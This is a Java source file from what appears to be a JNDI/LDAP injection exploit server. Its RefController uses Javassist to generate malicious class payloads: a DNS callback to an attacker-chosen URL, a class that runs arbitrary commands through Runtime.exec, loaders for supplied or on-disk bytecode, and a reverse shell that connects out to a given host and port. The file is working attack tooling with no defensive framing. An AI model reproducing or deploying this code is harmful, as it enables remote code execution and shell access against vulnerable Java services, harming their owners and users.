package com.example.exploit.controller;

import com.example.exploit.annotation.LdapController;
import com.example.exploit.annotation.LdapMapping;
import com.example.exploit.template.ReverseShellTemplate;
import com.example.exploit.util.ReflectUtil;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import javassist.bytecode.ClassFile;

import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.Hashtable;

@LdapController
@LdapMapping("/Ref")
public class RefController {
    @LdapMapping("/DnsLog")
    public byte[] dnsLog(Hashtable<String, String> params) throws Exception {
        String className = params.get("className");
        String url = params.get("url");

        if (!url.startsWith("http://")) {
            url = "http://" + url;
        }

        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass(className);
        String body = String.format("new java.net.URL(\"%s\").hashCode();", url);
        clazz.makeClassInitializer().setBody(body);

        System.out.println("[Ref] DnsLog: " + url);
        return clazz.toBytecode();
    }

    @LdapMapping("/Exec")
    public byte[] exec(Hashtable<String, String> params) throws Exception {
        String className = params.get("className");
        String cmd = params.get("cmd");
        String type = params.get("type");

        if ("base64".equals(type)) {
            cmd = new String(Base64.getDecoder().decode(cmd));
        }

        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass(className);
        String body = String.format("java.lang.Runtime.getRuntime().exec(\"%s\");", cmd);
        clazz.makeClassInitializer().setBody(body);

        System.out.println("[Ref] Cmd: " + cmd);
        return clazz.toBytecode();
    }

    @LdapMapping("/FromCode")
    public byte[] fromCode(Hashtable<String, String> params) throws Exception {
        String className = params.get("className");
        String code = params.get("code").replace(" ", "+");
        byte[] data = Base64.getDecoder().decode(code);

        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass(new ClassFile(new DataInputStream(new ByteArrayInputStream(data))));
        clazz.replaceClassName(clazz.getName(), className);

        System.out.println("[Ref] FromCode ClassName: " + clazz.getName() + " Length: " + data.length);
        return clazz.toBytecode();
    }

    @LdapMapping("/FromPath")
    public byte[] fromPath(Hashtable<String, String> params) throws Exception {
        String className = params.get("className");
        String path = params.get("path");
        byte[] data = Files.readAllBytes(Paths.get(path));

        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass(new ClassFile(new DataInputStream(new ByteArrayInputStream(data))));
        clazz.replaceClassName(clazz.getName(), className);

        System.out.println("[Ref] FromPath ClassName: " + clazz.getName() + " Path: " + path + " Length: " + data.length);
        return clazz.toBytecode();
    }

    @LdapMapping("/ReverseShell")
    public byte[] reverseShell(Hashtable<String, String> params) throws Exception {
        String className = params.get("className");
        String host = params.get("host");
        int port = Integer.parseInt(params.get("port"));
        String shell = params.get("shell");

        if (shell == null) {
            shell = "sh";
        }

        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(ReverseShellTemplate.class.getName());

        ReflectUtil.setCtField(clazz, "host", CtField.Initializer.constant(host));
        ReflectUtil.setCtField(clazz, "port", CtField.Initializer.constant(port));
        ReflectUtil.setCtField(clazz, "shell", CtField.Initializer.constant(shell));

        clazz.replaceClassName(clazz.getName(), className);

        System.out.println("[Ref] ReverseShell ClassName: " + clazz.getName() + " Host: " + host + " Port: " + port + " Shell: " + shell);
        return clazz.toBytecode();
    }

    @LdapMapping("/MemShell")
    public byte[] memShell(Hashtable<String, String> params) throws Exception {
        return null;
    }
}
